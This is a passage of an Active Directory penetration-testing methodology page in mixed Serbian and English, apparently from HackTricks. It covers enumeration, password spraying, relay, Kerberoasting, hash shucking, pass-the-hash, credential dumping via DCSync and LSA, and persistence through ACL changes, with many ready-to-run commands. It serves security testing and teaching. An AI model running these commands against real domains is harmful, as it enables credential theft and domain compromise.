# Active Directory Metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **mrežnim administratorima** efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** unutar mreže. Dizajniran je da se lako skalira, omogućavajući organizovanje velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura **Active Directory** obuhvata tri osnovna sloja: **domene**, **stabla** i **šume**. **Domena** obuhvata skup objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe ovih domena povezane zajedničkom strukturom, dok **šuma** predstavlja kolekciju više stabala, povezanih putem **trust relationships**, formirajući najviši nivo organizacione strukture. Specifična **prava pristupa** i **komunikacije** mogu se dodeljivati na svakoj od ovih razina.

Ključni koncepti unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na Active Directory objekte.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene foldere**.
3. **Domain** – Služi kao kontejner za direktorijumske objekte; moguće je imati više domena unutar jedne **šume**, pri čemu svaki održava sopstvenu kolekciju objekata.
4. **Tree** – Grupisanje domena koja dele zajedničku root domenu.
5. **Forest** – Najviši nivo organizacione strukture u Active Directory, sastavljen od više stabala sa **trust relationships** između njih.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ti servisi uključuju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijom između **korisnika** i **domenа**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje sigurnim **digital certificates**.
3. **Lightweight Directory Services** – Pruža podršku aplikacijama koje koriste direktorijum putem **LDAP protocol**.
4. **Directory Federation Services** – Omogućava **single-sign-on** kako bi se korisnici autentifikovali preko više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskih materijala regulisanjem neovlaštene distribucije i upotrebe.
6. **DNS Service** – Kritičan za razrešavanje **domain names**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da napadnete AD, morate veoma dobro razumeti Kerberos proces autentikacije.\
[**Pročitajte ovu stranicu ako još uvek ne znate kako to funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Možete pogledati [https://wadcoms.github.io/](https://wadcoms.github.io) za brz pregled komandi koje možete pokrenuti da biste enumerisali/eksploatisali AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** za izvođenje akcija. Ako pokušate da pristupite mašini po IP adresi, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ako imate pristup AD okruženju ali nemate nikakve kredencijale/sesije, možete:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **eksploatišete ranjivosti** ili **ekstrahujete kredencijale** sa njih (na primer, [printeri mogu biti vrlo interesantni ciljevi](ad-information-in-printers.md)).
- Enumeracija DNS-a može dati informacije o ključnim serverima u domenu kao što su web, printers, shares, vpn, media itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako to raditi.
- **Proverite null i Guest pristup na smb servisima** (ovo neće raditi na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o tome kako enumerisati SMB server može se naći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o enumeraciji LDAP-a može se naći ovde (obraćajte **posebnu pažnju na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite kredencijale lažnim predstavljanjem servisa koristeći Responder: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
- Pristupite hostu zloupotrebom the relay attack: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack
- Prikupite kredencijale izlažući lažne UPnP servise pomoću evil-S: ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Ekstrahujte korisnička imena/ime i prezime iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domen okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih, možete pokušati različite AD **username conventions** ([**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Pogledajte stranice za **pentesting SMB** i **pentesting LDAP**.
- **Kerbrute enum**: Kada je zahtevan nevalidan username, server će odgovoriti koristeći Kerberos error code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je username nevažeći. **Validni korisnički nalozi** će izazvati ili TGT u AS-REP odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da je korisnik obavezan da izvrši pre-autentikaciju.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) prema MS-NRPC (Netlogon) interfejsu na domain controller-ima. Metoda poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih kredencijala. Alat NauthNRPC implementira ovu vrstu enumeracije. Istraživanje je dostupno ovde: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera u mreži, možete takođe izvršiti **user enumeration against it**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Poznavanje jednog ili više korisničkih imena

Ok, dakle već znate da imate važeće korisničko ime ali nemate lozinku... Onda pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **request a AS_REP message** za tog korisnika koja će sadržati podatke šifrovane izvedenicom korisnikove lozinke.
- [**Password Spraying**](password-spraying.md): Pokušajte najčešće **common passwords** za svakog od otkrivenih korisnika — možda neko koristi lošu lozinku (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **obtain** neke challenge **hashes** za crackovanje tako što ćete raditi **poisoning** određenih protokola na **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete Active Directory, imaćete **more emails and a better understanding of the network**. Možda ćete moći da primenite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) da dobijete pristup AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC is blocked** by signing, i dalje proverite **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / weak channel binding. DC sa SMB signing required ali LDAP signing disabled i dalje ostaje izvodljiv cilj za **relay-to-LDAP** zloupotrebe kao što su **SPN-less RBCD**.

### Kredencijalni leaks štampača na strani klijenta → masovna validacija domen kredencijala

- Printer/web UIs ponekad **embed masked admin passwords in HTML**. Viewing source/devtools može otkriti cleartext (npr., `<input value="<password>">`), omogućavajući Basic-auth pristup scan/print repositories.
- Dohvaćeni print jobs mogu sadržavati **plaintext onboarding docs** sa per-user lozinkama. Prilikom testiranja držite uparivanja usklađena:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Ukradi NTLM Creds

Ako možete **access other PCs or shares** sa **null or guest user**, možete **postaviti fajlove** (npr. SCF file) koji, ako se nekako otvore, će **pokrenuti NTLM authentication against you** tako da možete **steal** **NTLM challenge** da ga crack-ujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat lozinke za druge, sporije formate kojima je key material izveden direktno iz NT hasha. Umesto da brute-force-ujete duge passphrase-ove u Kerberos RC4 tiketima, NetNTLM challenge-ima ili cached credentials, ubacite NT hashe u Hashcat-ove NT-candidate mode-ove i ostavite ga da validira reuse lozinki bez ikada saznanja plaintext-a. Ovo je posebno moćno nakon kompromitovanja domena gde možete harvest-ovati hiljade trenutnih i istorijskih NT hash-eva.

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dumps, ili credential vault-ova i treba da testirate reuse u drugim domenima/forest-ovima.
- Uhvatite RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore, ili DCC/DCC2 blob-ove.
- Želite brzo dokazati reuse za duge, neprolomljive passphrase-ove i odmah pivot-ovati putem Pass-the-Hash.

Tehnika **ne radi** protiv encryption tipova čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen forsira AES-only, morate vratiti na regularne password mode-ove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history da dohvatite što veći set NT hash-eva (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History unosi dramatično proširuju kandidat pool jer Microsoft može čuvati do 24 prethodna hasha po nalogu. Za više načina za harvest-ovanje NTDS secrets pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i cached domain logone (DCC/DCC2). Deduplicirajte i append-ujte te hashe u isti `nt_candidates.txt` fajl.
- **Track metadata** – Čuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Matching hashevi vam odmah govore koji principal reuse-uje lozinku kada Hashcat print-a winning candidate.
- Preferirajte kandidate iz istog forest-a ili trusted forest-a; to maksimalizuje šansu za overlap pri shuckingu.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Isključite rule engine-e (bez `-r`, bez hybrid modova) jer mangling korumpira kandidat key material.
- Ovi mode-ovi nisu nužno brži, ali NTLM keyspace (~30,000 MH/s na M3 Max) je ~100× brži nego Kerberos RC4 (~300 MH/s). Testiranje kuriranog NT lista je mnogo jeftinije od istraživanja celog password prostora u sporom formatu.
- Uvek koristite **najnoviji Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) zato što su mode-ovi 31500/31600/35300/35400 isporučeni skoro.
- Trenutno ne postoji NT mode za AS-REQ Pre-Auth, i AES etype-ovi (19600/19700) zahtevaju plaintext password jer se njihovi ključevi izvode putem PBKDF2 iz UTF-16LE password-a, ne iz raw NT hash-eva.

#### Primer – Kerberoast RC4 (mode 35300)

1. Capture-ujte RC4 TGS za ciljani SPN sa low-privileged user-om (pogledajte Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck-ujte ticket sa vašom NT listom:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i validira `$krb5tgs$23$...` blob. Poklapanje potvrđuje da service account koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pivot-ujte putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Neobavezno možete kasnije recover-ovati plaintext sa `hashcat -m 1000 <matched_hash> wordlists/` ako je potrebno.

#### Primer – Cached credentials (mode 31600)

1. Dump-ujte cached logone sa kompromitovane radne stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju za interesantnog domain korisnika u `dcc2_highpriv.txt` i shuck-ujte je:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno podudaranje daje NT hash koji je već poznat u vašem listu, što dokazuje da cached user reuse-uje lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da povratite string.

Isti workflow važi i za NetNTLM challenge-response (`-m 27000/27100`) i DCC (`-m 31500`). Jednom kada je match identifikovan možete lansirati relay, SMB/WMI/WinRM PtH, ili ponovo crack-ovati NT hash sa mask-ama/rulama offline.

## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate imati **kompromitovane credentials ili sesiju validnog domain naloga.** Ako imate neke valid credentials ili shell kao domain user, **zapamtite da su opcije navedene ranije i dalje opcije za kompromitovanje drugih korisnika.**

Pre nego što počnete authenticated enumeration trebate znati šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje naloga je **veliki korak ka kompromitovanju celog domena**, jer ćete moći da započnete **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- Možete koristiti [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete takođe koristiti [**powershell for recon**](../basic-powershell-for-pentesters/index.html) koji će biti stealthier
- Takođe možete [**use powerview**](../basic-powershell-for-pentesters/powerview.md) da ekstrahujete detaljnije informacije
- Još jedan sjajan alat za recon u Active Directory je [**BloodHound**](bloodhound.md). On nije **vrlo stealthy** (zavisi od metoda kolekcije koje koristite), ali **ako vas to ne zanima**, svakako ga probajte. Pronađite gde korisnici mogu RDP-ovati, puteve do drugih grupa, itd.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) jer mogu sadržati interesantne informacije.
- Alat sa GUI koji možete koristiti za enumeraciju direktorijuma je **AdExplorer.exe** iz **SysInternal** Suite.
- Takođe možete pretraživati LDAP bazu pomoću **ldapsearch** da tražite kredencijale u poljima _userPassword_ & _unixUserPassword_, ili čak u _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, možete takođe enumerisati domen koristeći [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete probati i automatizovane alate kao:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sve korisničke naloge domena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). Na Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ova Enumeration sekcija izgleda mala, ovo je najvažniji deo svega. Posetite linkove (uglavnom one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne osećate sigurno. Tokom assessment-a, ovo će biti ključni trenutak da pronađete put do DA ili da odlučite da ništa ne može biti urađeno.

### Kerberoast

Kerberoasting uključuje dobijanje **TGS tickets** koje koriste servisi vezani za user naloge i crack-ovanje njihove enkripcije — koja je zasnovana na user password-ima — **offline**.

Više o tome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Kada dobijete neke kredencijale možete proveriti da li imate pristup nekom **mašini**. U tu svrhu možete koristiti **CrackMapExec** da pokušate konekciju na više servera preko različitih protokola, u skladu sa vašim port scan-ovima.

### Local Privilege Escalation

Ako imate kompromitovane credentials ili sesiju kao običan domain user i imate **access** tim korisnikom na **bilo koju mašinu u domenu**, trebate pokušati naći način da **eskalirate privilegije lokalno i loot-ujete kredencijale**. Samo sa lokalnim administrator privilegijama ćete moći **dump-ovati hasheve drugih korisnika** u memoriji (LSASS) i lokalno (SAM).

Postoji kompletna stranica u ovoj knjizi o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) i [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **unlikely** da ćete naći **tickets** u trenutnog user-a koji vam daju permission da pristupite neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više email-ova i bolje razumevanje mreže**. Možda ćete moći da prisilite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sada kada imate neke osnovne kredencijale trebalo bi da proverite da li možete **pronaći** neke **zanimljive fajlove koji se dele unutar AD-a**. Možete to raditi ručno, ali je to veoma dosadan i repetitivan zadatak (pogotovo ako nađete stotine dokumenata koje treba proveriti).

[**Pratite ovaj link da saznate o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete **pristupiti drugim PC-jevima ili deljenim folderima** mogli biste **postaviti fajlove** (npr. SCF fajl) koji bi, ako se na neki način pristupi njima, pokrenuli **NTLM authentication against you** tako da možete **steal** **NTLM challenge** i pokušati da ga razbijete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kom autentifikovanom korisniku da **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan, potrebne su posebne privilegije/kredencijali da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **compromise some local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hashes iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima za dobijanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash nekog korisnika**, možete ga koristiti da ga **impersonate**.\
Potrebno je koristiti neki **tool** koji će **izvršiti** **NTLM authentication using** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject** taj **hash** u **LSASS**, tako da kada se izvrši bilo koja **NTLM authentication**, taj **hash će biti korišćen.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **koristi korisnikov NTLM hash za zahtev Kerberos tiketa**, kao alternativa uobičajenom Pass The Hash preko NTLM protokola. Dakle, ovo može biti posebno **korisno u mrežama gde je NTLM protokol onemogućen** i gde je dozvoljen samo **Kerberos kao autentifikacioni protokol**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **ukradu autentifikacioni tiket korisnika** umesto njegove lozinke ili vrednosti hash-a. Ovaj ukradeni tiket se potom koristi da **lažno se predstave kao korisnik**, dobijajući neovlašćen pristup resursima i servisima u mreži.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** od **local administrator** trebalo bi da pokušate da se **login locally** na druge **PCs** sa tim podacima.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### MSSQL zloupotreba i pouzdane veze

Ako korisnik ima privilegije za **pristup MSSQL instancama**, mogao bi da ih iskoristi za **izvršavanje komandi** na MSSQL hostu (ako se pokreće kao SA), za **krađu** NetNTLM **hash**-a ili čak za izvođenje **relay** **attack**.\
Takođe, ako je MSSQL instanca trusted (database link) od druge MSSQL instance. Ako korisnik ima privilegije nad trusted bazom, biće u mogućnosti da **iskoristi odnos poverenja i izvršava upite i u drugoj instanci**. Ovi trustovi mogu biti lančani i u nekom trenutku korisnik može pronaći pogrešno konfigurisanu bazu gde može izvršavati komande.\
**Veze između baza funkcionišu čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT asset/deployment platformi

Softver za inventory i deployment trećih strana često izlaže moćne puteve do credentials i izvršavanja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na tom računaru, bićete u mogućnosti da dump-ujete TGTs iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, bićete u mogućnosti da izvadite njegov TGT i imitirate ga koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation možete čak i **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljena "Constrained Delegation", biće u mogućnosti da **preuzme identitet bilo kog korisnika da pristupi nekim servisima na računaru**.\
Ako potom **kompromitujete hash** ovog korisnika/računara, moći ćete da **preuzmete identitet bilo kog korisnika** (čak i Domain Admin-a) da pristupite nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju na Active Directory objektu udaljenog računara omogućava postizanje izvršavanja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Kompromitovani korisnik može imati neke **zanimljive privilegije nad nekim domain objektima** koje vam mogu omogućiti da **se lateralno pomerate**/**eskalirate** privilegije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Otkriće **Spool service** koji sluša unutar domena može se **zloupotrebiti** za **dobijanje novih credentials** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **drugi korisnici** **pristupaju** kompromitovanom računaru, moguće je **prikupiti credentials iz memorije** i čak **ubrizgati beacone u njihove procese** kako biste se predstavljali kao oni.\
Korisnici obično pristupaju sistemu putem RDP-a, pa ovde imate kako izvesti par napada nad third party RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **local Administrator password**-om na računarima priključenim na domen, osiguravajući da je **nasumična**, jedinstvena i često **menjana**. Ove lozinke se čuvaju u Active Directory i pristup im je kontrolisan kroz ACLs samo za autorizovane korisnike. Sa dovoljnim dozvolama za pristup ovim lozinkama, pivotiranje na druge računare postaje moguće.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Prikupljanje sertifikata** sa kompromitovanog računara može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su konfigurirane **ranjive template**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin** ili još bolje **Enterprise Admin**, možete **izvući** **bazu domena**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od tehnika ranije opisanih mogu se koristiti za persistence.\
Na primer, možete:

- Napraviti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Napraviti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

